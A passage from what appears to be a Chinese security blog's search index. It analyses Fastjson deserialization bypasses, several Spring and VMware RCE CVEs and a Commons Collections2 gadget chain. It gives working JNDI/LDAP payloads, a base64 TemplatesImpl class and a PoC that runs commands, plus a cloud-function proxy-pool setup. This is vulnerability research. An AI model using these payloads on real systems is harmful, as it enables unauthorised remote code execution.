反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"JdbcRowSetImpl 直接来看一下JdbcRowSetImpl中的setAutoCommit函数，当this.conn为null的时候会进入到this.connect()中，而this.conn在构造函数中初始为null 继续跟进可以看见var1.lookup()经典的JNDI注入，且DataSourceName可控 因此直接构造以下payload {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 这里注意一点，jdk版本需要满足 8u161 \u003c jdk \u003c 8u191 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:1:1","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"TemplatesImpl 这个链子利用条件比较苛刻，因为要用到的变量都是private的需要在反序列化时加上Feature.SupportNonPublicField参数 先来看一下TemplatesImpl的getOutputProperties方法，它是_outputProperties的getter方法，在前面讲到过Fastjson的一些其它功能点就是在为类属性调用getter/setter时会调用smartMatch()忽略掉_ -字符串，这里还用到了另一个功能点就是因为最后payload为byte[]会进行base64编码，继续往下看这里会去调用newTransformer() 继续跟进，在newTransformerImpl对象时会进入到getTransletInstance()中 继续跟进，在getTransletInstance()中，如果在_name不等于null且_class等于null时会进入到defineTransletClasses()中，这里先继续往下看，其中_transletIndex为-1，也就是说会对_class数组中的第一个类进行实例化，并且会强制转换为AbstractTranslet，接下来来看下class是怎么来的 跟进到defineTransletClasses()中，通过for循环加载_bytecodes[]来加载类，也就是说_bytecodes[]就是我们构造注入的点，其中_tfactory不为null，并且因为加载完类后会强制类型转换为AbstractTranslet，也就是说加载的类必须为AbstractTranslet的子类，这样整条链子就齐了 总结一下TemplatesImpl链子要满足的点： fastjson反序列化时需有Feature.SupportNonPublicField参数 _bytecodes[]需进行base64编码 _bytecodes[]中加载的类需为AbstractTranslet的子类 _name不为null _tfactory不为null payload如下： {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }} 在使用JSON.parseObject反序列化时看到很多文章里加了一个config参数，发现删了这个参数并不影响漏洞的触发，然后看了一下代码，发现在JSON类中已经自动帮我们加上了这个参数 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:1:2","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.25-1.2.41 在此版本中，新增了黑名单和白名单功能 在ParserConfig中，可以看到黑名单的内容，而且设置了一个autoTypeSupport用来控制是否可以反序列化，autoTypeSupport默认为false且禁止反序列化，为true时会使用checkAutoType来进行安全检测 接着来看一下checkAutoType怎么进行拦截的，在autoTypeSupport开启的情况下先通过白名单进行判断，如果符合的话就进入TypeUtils.loadClass，然后在通过黑名单进行判断，如果在黑名单中就直接抛出异常 接着继续往下看，从Mapping中寻找类然后继续从deserializers中寻找类，这里先不做过多解释继续往下看，如果autoTypeSupport没有开启的情况下，会对指定的@type类进行黑白名单判断，然后抛出异常，最后如果autoTypeSupport开启的情况下，会再一次进行判断然后进入到TypeUtils.loadClass中 在TypeUtils.loadClass中，可以看到对[ L ;进行了处理，而其中在处理L ; 的时候存在了逻辑漏洞，可以在@type的前后分别加上L ;来进行绕过 因此构造payload如下： ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:2:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.42 在此版本中，将黑名单改为了hashcode，但是在com.alibaba.fastjson.util.TypeUtils#fnv1a_64中有hashcode的计算方法，然后在checkAutoType中，使用hashcode对L ;进行了截取，然后进入到TypeUtils.loadClass中，也就是说对L ;进行双写即可绕过 payload如下： ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:3:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.43 在此版本中,checkAutoType对LL进行了判断，如果类以LL开头，则直接抛出异常 在TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过，具体可以根据报错抛出的异常来进行构造payload payload如下： ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} 该payload在前几个版本也可以使用，影响版本1.2.25 \u003c= fastjson \u003c= 1.2.43 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:4:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.44 修复了[的绕过，在checkAutoType中进行判断如果类名以[开始则直接抛出异常 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:5:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.45 增加了黑名单，存在组件漏洞，需要有mybatis组件 影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.45 payload如下： ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://127.0.0.1:1389/g0tvin\"}} ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:6:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.47 在此版本中可以在不开启autoTypeSupport的情况下，触发漏洞 影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.47 payload如下： { \"1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"2\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:1389/g0tvin\", \"autoCommit\": true } } 问题还是在checkAutoType中，在开启autoTypeSupport的情况下，代码会走到Arrays.binarySearch(this.denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null来进行判断抛出异常，如果不符合的话会继续往下走从Mapping和deserializers中寻找类，如果存在则返回clazz 而在ParserConfig类初始化时会执行initDeserializers方法，会向deserializers中添加许多的类，类似一种缓存，其中会添加这么一个类this.deserializers.put(Class.class, MiscCodec.instance); 进入到MiscCodec类中，有这么一个方法deserialze，而在进行json反序列化时会调用这个方法，在方法内会对clazz进行判断，当类为Class.class也就是java.lang.Class类时，会进入到TypeUtils.loadClass中 在TypeUtils.loadClass中，如果cache为true则会将className放到mapping中，其中cache默认为true，className为传进来的strVal 在deserialze中，strVal由objVal强制转换而来 strVal = (String)objVal 而objVal是在parser.parse()中截取而来，且参数名必须为val，否则会抛出异常，也就是说可以通过反序列化往mapping中添加任何类，这样的话添加com.sun.rowset.JdbcRowSetImpl类，从而绕过autoTypeSupport的和黑名单的限制，然后再次传递json去触发JdbcRowSetImpl的JNDI注入 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:7:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.48 在MiscCodec中修改了cache的默认值，修改为false，并且对TypeUtils.loadClass中的mapping.put做了限制 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:8:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.68 在1.2.48 - 1.2.68中还出现了一些黑名单的绕过，这里就不细讲了，在此版本中新增了一个safeMode功能，如果开启的话，将会直接抛出异常，完全杜绝了autoTypeSupport的绕过，于此同时还曝出了在不开启safeMode的前提下，对autoTypeSupport的绕过 通过expectClass进行绕过，当传入的expectClass不在黑名单中后，expectClassFlag的值为true时，会调用TypeUtils.loadClass加载类，其中clazz也就是传进去的另一个类名必须为expectClass的子类 其中java.lang.AutoCloseable因为在白名单中，因此可以使用其子类来进行绕过autoTypeSupport 这里稍微总结一下恶意类要满足的条件： 恶意类不在黑名单内 恶意类的父类（例如AutoCloseable）不在黑名单内 恶意类不能是抽象类 恶意类中的getter/setter/static block/constructor能触发恶意操作 参考链接 https://su18.org/post/fastjson/ https://y4er.com/post/fastjson-learn/ https://goodapple.top/archives/832 ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:9:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"简介 Workspace ONE Access 提供统一应用门户,通过门户可安全访问企业的所有应用，可用于单点登录。CVE-2022-22954 中，攻击者可构造恶意请求造成模板注入，执行任意代码，控制服务器。 漏洞版本 VMware Workspace ONE Access : 21.08.0.1，21.08.0.0，20.10.0.1，20.10.0.0 环境搭建 ova文件VMware直部署，在导入ova中Host Name(FQDN)需设置一个域名，可本地host文件自行设置，其余一律默认即可 漏洞分析 直接来看漏洞点，在customError.ftl中 在官方文档中，可以看到eval的存在会执行FTL表达式，官方也在提示会造成恶意注入 看一下这个jar包的构造属于springBoot，可通过Controller查找那个Controller会return到customError.ftl中 在com.vmware.endusercatalog.ui.web.UiErrorController#handleGenericError中，接受一个String errorMessage参数，并把它put到errorObj中，然后返回到customError.ftl中，中间没有对其进行任何操作 接着往上回溯看那个函数调用handleGenericError，在handleUnauthorizedError中调用了两次handleGenericError，而在getErrorPage中又调用了handleUnauthorizedError和handleGenericError，也就是说继续往上回溯getErrorPage 接着找到了两个路由sendError和sendUnhandledError，都接收到前端传进来的javax.servlet.error.message并赋值给errorMessage，此时javax.servlet.error.message不可控，继续去找可以赋值并且会返回给这两个路由的方法 接着在UiApplicationExceptionResolver类中找到了resolveException和handleAnyGenericException，在resolveException中会request.setAttribute(\"javax.servlet.error.message\", errorJson);set值，然后返回到\"/ui/view/error\"，接着又找到了handleAnyGenericException会去调用resolveException，并在((LocalizationParamValueException)ex).getArgs())中得到args值，而它还有一个注解@ExceptionHandler({Exception.class})表示会在被@RequestMapping注解的方法抛出异常时会执行此方法 接下来就是想办法让其抛出异常，在启动类中有一个自动扫描包的注解，其中会扫描com.vmware.endusercatalog.auth下的包，里面有一个拦截器AuthContextPopulationInterceptor，会get到request中的deviceUdid参数值，然后通过build()new一个AuthContext对象 在AuthContext构造函数中，最后会抛出一个InvalidAuthContextException异常，而只要deviceId或者deviceType不为空即可触发异常然后执行handleAnyGenericException 因为在拦截器中触发异常，因此url可以是类中定义的过的@RequestMapping注解 复现结果如下 参考链接 https://y4er.com/post/cve-2022-22954-vmware-workspace-one-access-server-side-template-injection-rce/ ","date":"2022-04-18","objectID":"/cve-2022-22954-vmware-workspace-one-access-ssti-rce/:0:0","tags":[],"title":"CVE-2022-22954 VMware Workspace ONE Access  SSTI RCE 简单分析","uri":"/cve-2022-22954-vmware-workspace-one-access-ssti-rce/"},{"categories":[],"content":"云函数的理解 云函数（Serverless Cloud Function，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码， 是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF 平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。 无服务器（Serverless）不是表示没有服务器，而表示在使用 Serverless 时，我们无需关心底层资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。使用云函数（SCF）时，我们只需使用平台支持的语言（Python、Node.js、PHP、Golang、Java 及 Custom Runtime）编写代码，云计算厂商将完全管理底层计算资源，包括服务器 CPU、内存、网络和其他配置/资源维护、代码部署、弹性伸缩、负载均衡、安全升级、资源运行情况监控等。 原理图如下 代理池搭建 所需要的工具如下： SCFProxy 腾讯云云函数 mitmproxy 进入函数服务-\u003e选择自定义地区-\u003e进入新建 选择从头开始-\u003e选择运行环境为Python3.6-\u003e选择在线编辑，其中内容为SCFProxy/HTTP/src/server.py其中SCF_TOKEN可自定义，如要更改需同client.py一起修改 函数服务创建成功后-\u003e选择触发管理-\u003e创建触发器-\u003e触发方式选择API网关触发 访问路径接下来需填入SCFProxy/HTTP/src/client.py的scf_servers: List[str] = []中 接下来通过mitmproxy提供本地代理进行运行 mitmproxy证书在C:\\Users\\[用户名]\\.mitmproxy下选择信任并安装即可 运行以下命令即可： mitmdump -s client.py -p 8081 --no-http2 如在VPS上运行需将block_global参数设置为false mitmdump -s client.py -p 8081 --no-http2 --set block_global=false 效果如下： 参考链接 https://cloud.tencent.com/document/product/583/9705 ","date":"2022-04-06","objectID":"/%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86%E6%B1%A0/:0:0","tags":[],"title":"云函数搭建代理池","uri":"/%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86%E6%B1%A0/"},{"categories":[],"content":"前言 刚曝出来的Spel表达式注入漏洞，这里简单分析一下 漏洞版本 3.0.0.RELEASE \u003c= Spring Cloud Function \u003c= 3.2.2 环境搭建 地址：https://github.com/spring-cloud/spring-cloud-function/tree/v3.2.1/spring-cloud-function-samples/function-sample-pojo 导入idea中，找到SampleApplication启动即可 漏洞分析 先来看一下diff 明显的SpEL表达式注入点，因为已知怎么利用，直接在代码处打个断点 先来看一下堆栈: functionFromExpression:196, RoutingFunction (org.springframework.cloud.function.context.config) route:126, RoutingFunction (org.springframework.cloud.function.context.config) apply:85, RoutingFunction (org.springframework.cloud.function.context.config) doApply:698, SimpleFunctionRegistry$FunctionInvocationWrapper (org.springframework.cloud.function.context.catalog) apply:550, SimpleFunctionRegistry$FunctionInvocationWrapper (org.springframework.cloud.function.context.catalog) processRequest:100, FunctionWebRequestProcessingHelper (org.springframework.cloud.function.web.util) 先进入到org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#processRequest中，在这里处理request请求，最后进入到apply(input)中 看一下input的值 其中确实存有post包的内容，继续跟进往下走 会判断targer是否为RoutingFunction，是的话然后进入到org.springframework.cloud.function.context.config.RoutingFunction#route中 会尝试提取spring.cloud.function.routing-expression的值，然后进入到org.springframework.cloud.function.context.config.RoutingFunction#functionFromExpression中 最后到达SpEl表达式，造成注入，全程没有对spring.cloud.function.routing-expression的值进行任何的防护措施，在diff中对代码进行了以下的修改 当isViaHeader为true时，会使用SimpleEvaluationContext去处理请求，从而达到防护的目的 复现结果： 参考链接 https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52 ","date":"2022-03-28","objectID":"/cve-2022-22963-spring-cloud-function-spel/:0:0","tags":[],"title":"CVE-2022-22963 Spring Cloud Function SpEL RCE 简单分析","uri":"/cve-2022-22963-spring-cloud-function-spel/"},{"categories":[],"content":"前言 前段时间刚爆出来的洞，很多师傅都详细分析了各自的思路和想法，不过总要自己亲手去调试分析才能更好的进步，因此有了这篇文章 漏洞版本 Spring Cloud Gateway 3.1.0 3.0.0 to 3.0.6 Older, unsupported versions are also affected 环境搭建 地址：https://github.com/spring-cloud/spring-cloud-gateway/tree/v3.1.0 找到GatewaySampleApplication.java启动即可 漏洞分析 先看一下commit删除的漏洞代码 https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e 可以看出这里会执行spel表达式，使用StandardEvaluationContext显然是不安全的在加上参数外部可控导致了spel表达式注入，修复后使用了更安全的GatewayEvaluationContext来解析spel表达式，直接来看一下org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue 会对#{}里面的内容进行spel解析，接下来进行回溯看一下哪里使用了getValue() ShortcutType是个枚举类，类中重写了三个normalize()都调用了getValue()，而在ShortcutConfigurable接口类中有以下代码： default ShortcutType shortcutType() { return ShortcutType.DEFAULT; } 会去调用默认的normalize()，然后对shortcutType()进行回溯 在normalizeProperties()中会对filer的属性进行解析，其中this.properties是Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());中的entryValue,然后一步一步转到getValue()中进入SPEL表达式中触发命令，接着继续对this.properties参数进行回溯 继续对properties()进行回溯 这里有两个函数调用了properties()并且进行了传参，一一对其回溯后，最终都回溯到了getRoutes()中的this::convertToRoute 到这里后就很容易理解了，在添加新路由后会加载到filter中，其中某个参数最后进入到getValue()中执行了SPEL表达式造成了注入 接下来来看一下官方文档 https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html 接下来就是构造新路由然后去触发漏洞，这里看了Y4er师傅的文章，找到了org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint#save，在AbstractGatewayControllerEndpoint.java中对路由进行增删操作 在增加路由时进行了校验，需要与filter进行匹配，也就是说在构造poc时新增已有的filter就可以触发漏洞，这里直接贴一张Y4er师傅的图 这里贴一下部分堆栈内容: getValue:60, ShortcutConfigurable (org.springframework.cloud.gateway.support) normalize:94, ShortcutConfigurable$ShortcutType$1 (org.springframework.cloud.gateway.support) normalizeProperties:140, ConfigurationService$ConfigurableBuilder (org.springframework.cloud.gateway.support) bind:241, ConfigurationService$AbstractBuilder (org.springframework.cloud.gateway.support) loadGatewayFilters:144, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route) getFilters:176, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route) convertToRoute:117, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route) apply:-1, 1876548582 (org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator$$Lambda$845) onNext:106, FluxMap$MapSubscriber (reactor.core.publisher) tryEmitScalar:488, FluxFlatMap$FlatMapMain (reactor.core.publisher) onNext:421, FluxFlatMap$FlatMapMain (reactor.core.publisher) drain:432, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher) innerComplete:328, FluxMergeSequential$MergeSequentialMain (reactor.core.publisher) 看完堆栈后，在org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#loadGatewayFilters中，先进行了properties(definition.getArgs())传参，然后进行了bind()绑定路由 漏洞复现 直接通过burp抓包添加路由 然后直接refresh 参考链接 https://y4er.com/post/cve-2022-22947-springcloud-gateway-spel-rce-echo-response/ ","date":"2022-03-08","objectID":"/cve-2022-22947-spring-cloud-gateway-spel-rce/:0:0","tags":[],"title":"CVE-2022-22947 Spring Cloud Gateway SPEL RCE 简单分析","uri":"/cve-2022-22947-spring-cloud-gateway-spel-rce/"},{"categories":[],"content":"前言 继续学习cc链，重点在于新知识的学习和运用 环境搭建 创建maven项目，pox.xml修改为如下内容 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003ecc2\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cproperties\u003e \u003cmaven.compiler.source\u003e7\u003c/maven.compiler.source\u003e \u003cmaven.compiler.target\u003e7\u003c/maven.compiler.target\u003e \u003c/properties\u003e \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003csource\u003e6\u003c/source\u003e \u003ctarget\u003e6\u003c/target\u003e \u003c/configuration\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections4\u003c/artifactId\u003e \u003cversion\u003e4.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.javassist\u003c/groupId\u003e \u003cartifactId\u003ejavassist\u003c/artifactId\u003e \u003cversion\u003e3.25.0-GA\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 这里jdk版本是7u80 前置知识 ","date":"2022-02-28","objectID":"/apache-commons-collections2/:0:0","tags":[],"title":"Apache Commons Collections2 反序列化漏洞分析","uri":"/apache-commons-collections2/"},{"categories":[],"content":"PriorityQueue PriorityQueue 是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator 在队列实例化的时排序。 PriorityQueue 不允许空值，而且不支持 non-comparable（不可比较）的对象，比如用户自定义的类。优先队列要求使用 Java Comparable 和 Comparator 接口给对象排序，并且在排序时会按照优先级处理其中的元素。 PriorityQueue 的大小是不受限制的，但在创建时可以指定初始大小。当我们向优先队列增加元素的时候，队列大小会自动增加。 ","date":"2022-02-28","objectID":"/apache-commons-collections2/:1:0","tags":[],"title":"Apache Commons Collections2 反序列化漏洞分析","uri":"/apache-commons-collections2/"},{"categories":[],"content":"Javassist Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。 ","date":"2022-02-28","objectID":"/apache-commons-collections2/:2:0","tags":[],"title":"Apache Commons Collections2 反序列化漏洞分析","uri":"/apache-commons-collections2/"},{"categories":[],"content":"TemplatesImpl TemplatesImpl 的属性_bytecodes存储了类字节码 TemplatesImpl 类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是 AbstractTranslet 在这个类的无参构造方法或静态代码块中写入恶意代码，再借 TemplatesImpl 之手实例化这个类触发恶意代码 漏洞分析 先来看一下ysoserial的gadget /* Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() */ 先进入到java.util.PriorityQueue#readObject中看一下，这里会进入到heapify()中 跟进到heapify()中后，会进入到siftDown()中 继续跟进，如果comparator的值不为空则会进入到siftDownUsingComparator()中 在siftDownUsingComparator()方法中，会调用comparator.compare()方法去进行排序和对比，此时new一个TransformingComparator类型的对象，则会进入到org.apache.commons.collections4.comparators.TransformingComparator#compare中 而在org.apache.commons.collections4.comparators.TransformingComparator#compare中，会去调用this.transformer.transform()，到这里应该就很熟悉了，在往下会去调用org.apache.commons.collections4.functors.InvokerTransformer#transform，可以通过反射去执行命令 下面是ysoserial的exp public Queue\u003cObject\u003e getObject(final String command) throws Exception { final Object templates = Gadgets.createTemplatesImpl(command); // mock method name until armed final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); // create queue with numbers and basic comparator final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2,new TransformingComparator(transformer)); // stub data for replacement later queue.add(1); queue.add(1); // switch method called by comparator Reflections.setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // switch contents of queue final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, \"queue\"); queueArray[0] = templates; queueArray[1] = 1; return queue; } public static void main(final String[] args) throws Exception { PayloadRunner.run(CommonsCollections2.class, args); } 这里大概的介绍一下整个流程，首先通过Javassist向TemplatesImpl的_bytecodes字段中加入想要执行的命令，然后通过反射将其加入到PriorityQueue队列中，到最后触发命令 而其并不是和cc5一样通过反射去执行命令，而是触发newTransformer方法实例化恶意类达到命令执行的效果，在newTransformer方法中会进入到getTransletInstance() 跟进到getTransletInstance()中，_class == null进入到defineTransletClasses()中，然后会将_bytecodes的值赋值给_class，然和返回到getTransletInstance()中 _class.newInstance()会对_class进行实例化，从而触发命令，这里是因为通过Javassist构造了一个恶意类，恶意类的内容为Runtime.getRuntime().exec(\"calc\");，因此实例化时会执行命令 POC如下： import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class cc2 { public static void main(String[] args) throws Exception { String AbstractTranslet=\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"; String TemplatesImpl=\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; ClassPool classPool=ClassPool.getDefault();//返回默认的类池 classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径 CtClass payload=classPool.makeClass(\"CommonsCollections22222222222\");//创建一个新的public类 payload.setSuperclass(classPool.get(AbstractTranslet)); //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet payload.makeClassInitializer().setBody(\"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"); //创建一个空的类初始化，设置构造函数主体为runtime byte[] bytes=payload.toBytecode();//转换为byte数组 Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\"_bytecodes\");//反射获取templatesImpl的_bytecodes字段 field.setAccessible(true); field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组 Field field1=templatesImpl.getClass().getDeclaredField(\"_name\");//反射获取templatesImpl的_name字段 field1.setAccessible(true); field1.set(templatesImpl,\"test\");//将templatesImpl上的_name字段设置为test InvokerTransformer transformer=new InvokerTransformer(\"newTransfo","date":"2022-02-28","objectID":"/apache-commons-collections2/:3:0","tags":[],"title":"Apache Commons Collections2 反序列化漏洞分析","uri":"/apache-commons-collections2/"},{"categories":[],"content":"简介 Oracle Fusion Middleware（组件：Core）的 Oracle WebLogic Server 产品中的漏洞。易于利用的漏洞允许未经身份验证的攻击者通过 T3 访问网络来破坏 Oracle WebLogic Server。成功攻击此漏洞可导致对某些 Oracle WebLogic Server 可访问数据的未经授权的更新、插入或删除访问，以及导致 Oracle WebLogic Server 的部分拒绝服务（部分 DOS）的未经授权的能力。 漏洞版本 